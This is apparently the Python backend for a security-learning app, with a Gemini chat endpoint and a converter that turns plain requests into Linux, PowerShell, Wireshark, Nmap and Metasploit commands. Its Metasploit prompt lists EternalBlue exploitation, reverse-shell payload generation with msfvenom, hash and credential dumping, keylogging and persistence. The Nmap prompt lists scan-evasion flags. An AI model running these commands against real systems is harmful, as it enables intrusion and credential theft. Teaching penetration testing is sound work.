"""
Learning Hub AI Chat Router

Provides AI-powered Q&A for learning pages using Gemini.
Also includes command converter for translating natural language to CLI commands.
Updated: Force reload
"""

from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel
from typing import List, Optional
import os
import json
import re

from backend.core.config import settings
from backend.core.auth import get_current_active_user
from backend.models.models import User

router = APIRouter(prefix="/learn", tags=["Learn Chat"])


class ChatMessage(BaseModel):
    role: str
    content: str


class LearnChatRequest(BaseModel):
    message: str
    page_title: str
    page_context: str
    conversation_history: Optional[List[ChatMessage]] = []


class LearnChatResponse(BaseModel):
    response: str


class CommandConvertRequest(BaseModel):
    query: str
    tool_type: str  # linux, powershell, wireshark, nmap, metasploit
    system_context: Optional[str] = None


class CommandConvertResponse(BaseModel):
    command: str
    explanation: str
    warnings: Optional[List[str]] = []
    alternatives: Optional[List[str]] = []
    related_tips: Optional[List[str]] = []


@router.post("/chat", response_model=LearnChatResponse)
async def learn_chat(
    request: LearnChatRequest,
    current_user: User = Depends(get_current_active_user),
):
    """
    AI-powered chat for learning pages.
    Uses the page context to provide relevant answers.

    Requires authentication.
    """
    try:
        # Import Gemini
        from google import genai
        
        api_key = os.getenv("GEMINI_API_KEY") or os.getenv("GOOGLE_API_KEY")
        if not api_key:
            raise HTTPException(
                status_code=500,
                detail="AI API key not configured"
            )
        
        client = genai.Client(api_key=api_key)
        
        # Build the system prompt with page context
        system_prompt = f"""You are a helpful cybersecurity learning assistant embedded in the VRAgent security scanner application.

You are currently helping a user learn about: **{request.page_title}**

Here is the context from the current learning page they are viewing:
---
{request.page_context[:8000]}  
---

Your role:
1. Answer questions about the topic based on the page content and your knowledge
2. Provide clear, educational explanations suitable for security learners
3. Give practical examples when helpful
4. Relate concepts to real-world security scenarios
5. Be encouraging and supportive of their learning journey

Guidelines:
- Keep responses concise but informative (2-4 paragraphs max unless more detail is requested)
- Use bullet points for lists
- Include code examples when relevant (with proper formatting)
- If asked about something not related to the page topic, you can still help but mention you're going beyond the current page
- Always maintain a focus on cybersecurity education
- Be accurate - if you're not sure about something, say so

Respond in a conversational, helpful tone."""

        # Build conversation messages
        messages = []
        
        # Add conversation history
        for msg in request.conversation_history[-10:]:  # Keep last 10 messages for context
            messages.append({
                "role": "user" if msg.role == "user" else "model",
                "parts": [{"text": msg.content}]
            })
        
        # Add current message
        messages.append({
            "role": "user",
            "parts": [{"text": request.message}]
        })
        
        # Generate response
        from google.genai import types
        response = client.models.generate_content(
            model=settings.gemini_model_id,
            contents=messages,
            config=types.GenerateContentConfig(
                system_instruction=system_prompt,
                thinking_config=types.ThinkingConfig(thinking_level="high"),
                max_output_tokens=1024,
            )
        )
        
        if response.text:
            return LearnChatResponse(response=response.text)
        else:
            return LearnChatResponse(
                response="I apologize, but I couldn't generate a response. Please try rephrasing your question."
            )
            
    except ImportError:
        raise HTTPException(
            status_code=500,
            detail="AI module not available. Please check server configuration."
        )
    except Exception as e:
        print(f"Learn chat error: {e}")
        raise HTTPException(
            status_code=500,
            detail=f"Failed to generate response: {str(e)}"
        )


# Tool-specific system prompts for command conversion
TOOL_SYSTEM_PROMPTS = {
    "linux": """You are an expert Linux/Bash command translator. Your task is to convert natural language requests into precise Linux/Bash commands.

Areas of expertise:
- File operations: find, grep, cat, ls, strings, file, xxd, binwalk, stat
- Network: netstat, ss, ip, nmap, tcpdump, curl, wget, netcat, socat
- Process & System: ps, top, uname, crontab, systemctl, journalctl
- Privilege Escalation: sudo -l, id, getcap, SUID binaries
- Hash & Crypto: md5sum, sha256sum, hashcat, john, openssl
- Log Analysis: journalctl, grep, awk, sed

Guidelines:
- Prefer modern commands (e.g., 'ip' over 'ifconfig', 'ss' over 'netstat')
- Include error suppression where appropriate (2>/dev/null)
- Consider security implications
- Provide complete, runnable commands""",

    "powershell": """You are an expert PowerShell command translator. Your task is to convert natural language requests into precise PowerShell commands.

Areas of expertise:
- File Operations: Get-ChildItem, Get-Content, Select-String, Get-FileHash
- Network: Get-NetTCPConnection, Test-NetConnection, Invoke-WebRequest
- Process & System: Get-Process, Get-Service, Get-ComputerInfo
- Active Directory: Get-ADUser, Get-ADGroup, Get-ADComputer, Get-ADDomain
- Privilege & Security: whoami, net user, Get-LocalUser
- Execution & Bypass: Set-ExecutionPolicy, download cradles

Guidelines:
- Use proper PowerShell conventions (Verb-Noun format)
- Use pipeline operations effectively
- Include aliases where commonly used
- Note admin requirements when applicable""",

    "wireshark": """You are an expert Wireshark display filter translator. Your task is to convert natural language requests into precise Wireshark display filters.

CRITICAL: You are generating DISPLAY FILTERS for Wireshark, NOT commands to run in a terminal.

Display Filter Syntax Reference:
- Comparison: == (equals), != (not equals), > (greater), < (less), >= (gte), <= (lte)
- Contains: field contains "string" (case-sensitive substring match)
- Matches: field matches "regex" (Perl-compatible regex)
- Logical: && (and), || (or), ! (not), and, or, not
- Membership: field in {val1, val2, val3}
- Ranges: field[offset:length] for byte slices

Common Filter Fields:
- IP: ip.addr, ip.src, ip.dst, ipv6.addr
- TCP: tcp.port, tcp.srcport, tcp.dstport, tcp.flags.syn, tcp.flags.ack, tcp.flags.fin, tcp.flags.rst
- UDP: udp.port, udp.srcport, udp.dstport
- HTTP: http, http.request, http.response, http.request.method, http.response.code, http.host, http.request.uri, http.user_agent, http.cookie
- HTTPS/TLS: tls, tls.handshake, tls.handshake.type, tls.handshake.extensions_server_name
- DNS: dns, dns.qry.name, dns.qry.type, dns.a, dns.aaaa, dns.resp.name
- SMB: smb, smb2, smb2.filename, smb2.cmd
- FTP: ftp, ftp.request.command, ftp.response.code
- SSH: ssh
- ICMP: icmp, icmp.type, icmp.code
- Frame: frame.len, frame.time, frame contains "string"

Example Filters:
- "ip.addr == 192.168.1.1" - Traffic to/from specific IP
- "tcp.port == 80 || tcp.port == 443" - HTTP or HTTPS traffic
- "http.request.method == POST" - HTTP POST requests
- "dns.qry.name contains google" - DNS queries for google domains
- "tcp.flags.syn == 1 && tcp.flags.ack == 0" - SYN packets (port scan detection)
- "http.response.code >= 400" - HTTP error responses
- "tls.handshake.type == 1" - TLS Client Hello packets
- "frame contains password" - Any packet containing "password"
- "smb2.filename contains .exe" - SMB transfers of .exe files

Guidelines:
- Output ONLY the display filter syntax, not terminal commands
- Use proper field names and operators
- Provide compound filters for complex requirements
- Explain what traffic the filter will show""",

    "nmap": """You are an expert Nmap command translator. Your task is to convert natural language requests into precise Nmap scan commands.

CRITICAL: Include a target placeholder like <target>, <IP>, or the actual target if specified.

Core Scan Types:
- -sS: TCP SYN scan (stealth, requires root)
- -sT: TCP connect scan (no root needed)
- -sU: UDP scan
- -sA: ACK scan (firewall detection)
- -sN/-sF/-sX: NULL/FIN/Xmas scans (stealth)
- -sn: Ping scan only (host discovery)
- -Pn: Skip ping (assume host is up)

Port Specification:
- -p 22: Single port
- -p 22,80,443: Specific ports
- -p 1-1000: Port range
- -p-: All 65535 ports
- --top-ports 100: Top N ports

Service/Version Detection:
- -sV: Service version detection
- -O: OS detection
- -A: Aggressive (sV + O + scripts + traceroute)
- -sC: Default NSE scripts
- --version-intensity 0-9: Version scan intensity

NSE Scripts:
- --script=vuln: Vulnerability scripts
- --script=safe: Safe scripts
- --script=auth: Authentication scripts
- --script=smb-vuln-ms17-010: Specific script
- --script "http-*": Wildcard scripts

Timing & Performance:
- -T0 to -T5: Timing templates (paranoid to insane)
- --min-rate 100: Minimum packets/second
- --max-retries 2: Limit retries

Evasion Techniques:
- -f: Fragment packets
- -D RND:10: Add 10 random decoys
- -S <spoofed_ip>: Spoof source IP
- --spoof-mac 0: Random MAC address
- -g 53: Use source port 53 (DNS)

Output Formats:
- -oN file.txt: Normal output
- -oX file.xml: XML output
- -oG file.gnmap: Grepable output
- -oA basename: All formats
- -v/-vv: Verbose output

Guidelines:
- Always include <target> or <IP> placeholder
- Include -T4 for faster scans unless stealth is needed
- Use --open to show only open ports
- Include -v for verbose output when appropriate""",

    "metasploit": """You are an expert Metasploit Framework command translator. Your task is to convert natural language requests into Metasploit console commands.

CRITICAL: Distinguish between msfconsole commands and msfvenom (payload generation) commands.

MSFConsole Core Commands:
- search type:exploit platform:windows smb - Search for modules
- use exploit/windows/smb/ms17_010_eternalblue - Load a module
- info - Show module information
- show options - Display required options
- set RHOSTS 192.168.1.1 - Set target
- set LHOST 192.168.1.100 - Set listener IP
- set LPORT 4444 - Set listener port
- set PAYLOAD windows/meterpreter/reverse_tcp - Set payload
- exploit / run - Execute the module
- background - Background current session
- sessions -l - List sessions
- sessions -i 1 - Interact with session 1

Multi/Handler (Listener):
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit -j (run as background job)

Meterpreter Commands:
- sysinfo - System information
- getuid - Current user
- getprivs - Current privileges
- getsystem - Attempt privilege escalation
- ps - List processes
- migrate <PID> - Migrate to process
- shell - Drop to system shell
- upload /local/file /remote/path - Upload file
- download /remote/file /local/path - Download file
- hashdump - Dump SAM hashes
- load kiwi - Load Mimikatz
- creds_all - Dump all credentials
- screenshot - Take screenshot
- keyscan_start/keyscan_dump - Keylogger

Post-Exploitation Modules:
- run post/windows/gather/hashdump
- run post/multi/recon/local_exploit_suggester
- run post/windows/manage/persistence_exe
- run post/windows/gather/enum_logged_on_users

MSFVenom (Payload Generation):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o payload.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o payload.php

Common Formats: exe, dll, elf, macho, raw, asp, aspx, war, jar, py, pl, sh, ps1, vba

Guidelines:
- Use proper search syntax: type:, platform:, name:, cve:
- Always show required options with 'show options'
- Include RHOSTS/RHOST for targets, LHOST/LPORT for callbacks
- For multi-step operations, show step-by-step commands
- Remind about proper authorization for testing"""
}


@router.post("/command-convert", response_model=CommandConvertResponse)
async def convert_command(
    request: CommandConvertRequest,
    current_user: User = Depends(get_current_active_user),
):
    """
    AI-powered natural language to command converter.
    Supports Linux, PowerShell, Wireshark, Nmap, and Metasploit.

    Requires authentication.
    """
    try:
        from google import genai
        
        api_key = os.getenv("GEMINI_API_KEY") or os.getenv("GOOGLE_API_KEY")
        if not api_key:
            raise HTTPException(
                status_code=500,
                detail="AI API key not configured"
            )
        
        client = genai.Client(api_key=api_key)
        
        # Get tool-specific context
        tool_context = TOOL_SYSTEM_PROMPTS.get(
            request.tool_type.lower(),
            request.system_context or "You are a command-line expert."
        )
        
        # Build the system prompt
        system_prompt = f"""{tool_context}

IMPORTANT: Your response MUST be valid JSON in exactly this format:
{{
    "command": "the exact command to run",
    "explanation": "a clear explanation of what the command does and how it works",
    "warnings": ["warning 1", "warning 2"],
    "alternatives": ["alternative command 1", "alternative command 2"],
    "related_tips": ["helpful tip 1", "helpful tip 2"]
}}

Rules:
1. The "command" field must contain only the command(s), nothing else
2. For multi-step processes, use semicolons or newlines in the command
3. Include 1-3 warnings if the command has security/risk implications
4. Include 1-2 alternative approaches if applicable
5. Include 1-2 pro tips related to the task
6. Keep explanations concise but informative
7. If the request is unclear, provide the most likely intended command
8. Always return valid JSON - no markdown, no code blocks, just JSON"""

        # Generate response
        from google.genai import types
        response = client.models.generate_content(
            model=settings.gemini_model_id,
            contents=[{
                "role": "user",
                "parts": [{"text": f"Convert this to a {request.tool_type} command: {request.query}"}]
            }],
            config=types.GenerateContentConfig(
                system_instruction=system_prompt,
                thinking_config=types.ThinkingConfig(thinking_level="medium"),
                max_output_tokens=1024,
            )
        )
        
        if not response.text:
            raise HTTPException(
                status_code=500,
                detail="Failed to generate command"
            )
        
        # Parse the JSON response
        response_text = response.text.strip()
        
        # Clean up the response - remove markdown code blocks if present
        if response_text.startswith("```"):
            # Remove markdown code block markers
            lines = response_text.split("\n")
            # Remove first and last lines if they're code block markers
            if lines[0].startswith("```"):
                lines = lines[1:]
            if lines and lines[-1].strip() == "```":
                lines = lines[:-1]
            response_text = "\n".join(lines)
        
        # Try to extract JSON from the response
        try:
            # Try direct parse first
            result = json.loads(response_text)
        except json.JSONDecodeError:
            # Try to find JSON in the response
            json_match = re.search(r'\{[\s\S]*\}', response_text)
            if json_match:
                result = json.loads(json_match.group())
            else:
                # Fallback: return the raw response as the command
                result = {
                    "command": response_text,
                    "explanation": "Generated command based on your request.",
                    "warnings": [],
                    "alternatives": [],
                    "related_tips": []
                }
        
        return CommandConvertResponse(
            command=result.get("command", ""),
            explanation=result.get("explanation", ""),
            warnings=result.get("warnings", []),
            alternatives=result.get("alternatives", []),
            related_tips=result.get("related_tips", [])
        )
        
    except ImportError:
        raise HTTPException(
            status_code=500,
            detail="AI module not available. Please check server configuration."
        )
    except json.JSONDecodeError as e:
        print(f"JSON parse error: {e}")
        raise HTTPException(
            status_code=500,
            detail="Failed to parse AI response"
        )
    except Exception as e:
        print(f"Command convert error: {e}")
        raise HTTPException(
            status_code=500,
            detail=f"Failed to generate command: {str(e)}"
        )
